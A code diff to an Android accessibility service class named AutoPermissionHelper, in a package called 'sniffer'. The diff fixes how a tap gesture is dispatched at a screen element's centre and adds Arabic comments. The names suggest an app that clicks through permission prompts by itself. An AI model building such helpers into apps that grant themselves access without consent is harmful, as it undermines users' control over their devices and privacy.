@@ -1,15 +1,12 @@
 package com.v8.global.sniffer;
 
 import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.graphics.Path;
+import android.graphics.Rect;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
@@ -161,13 +158,19 @@ public class AutoPermissionHelper extends AccessibilityService {
     private void performClick(AccessibilityNodeInfo node) {
         if (node == null) return;
         
+        // الحصول على مستطيل موقع العنصر
+        Rect rect = new Rect();
+        node.getBoundsInScreen(rect);
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            // استخدام الإيماءات للإصدارات الحديثة
             Path path = new Path();
-            path.moveTo(node.getBoundsInScreen().centerX(), node.getBoundsInScreen().centerY());
+            path.moveTo(rect.centerX(), rect.centerY());
             GestureDescription.Builder builder = new GestureDescription.Builder();
             builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
             dispatchGesture(builder.build(), null, null);
         } else {
+            // الطريقة التقليدية للإصدارات القديمة
             node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
         }
     }
